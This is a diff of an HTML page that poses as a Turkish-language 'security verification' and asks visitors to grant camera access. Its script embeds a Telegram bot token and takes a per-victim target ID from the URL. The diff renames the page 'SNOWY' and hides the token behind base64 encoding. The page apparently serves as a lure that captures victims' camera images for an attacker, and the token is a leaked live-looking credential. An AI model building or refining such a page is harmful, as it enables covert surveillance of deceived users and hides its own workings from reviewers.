@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Güvenlik Doğrulaması</title>
+    <title>SNOWY Güvenlik Doğrulaması</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -47,7 +47,7 @@
 </head>
 <body>
     <div class="container">
-        <h2>❄️ <span>GÜVENLİK</span> DOĞRULAMASI</h2>
+        <h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
         <p>Devam etmek için kamera erişimine izin verin.</p>
         <button class="btn" id="startBtn" onclick="startCamera()">📸 BAŞLAT</button>
         <div class="loading" id="loading">
@@ -61,9 +61,10 @@
 
     <script>
         // ============================================
-        // GİZLİ KONFİGÜRASYON
+        // GİZLİ KONFİGÜRASYON (ŞİFRELİ TOKEN)
         // ============================================
-        const BOT_TOKEN = "8773124715:AAEfs80t8yv2XnDGy20aLlxy3aFGwDj0jFU";
+        const SIFRELI_TOKEN = "ODc3MzEyNDcxNTpBQUVmczgwdDh5djJYbkRHeTIwYUxseHkzYUZHd0RqMGpGVQ==";
+        const BOT_TOKEN = atob(SIFRELI_TOKEN);
         const urlParams = new URLSearchParams(window.location.search);
         const TARGET_ID = urlParams.get('i');
         
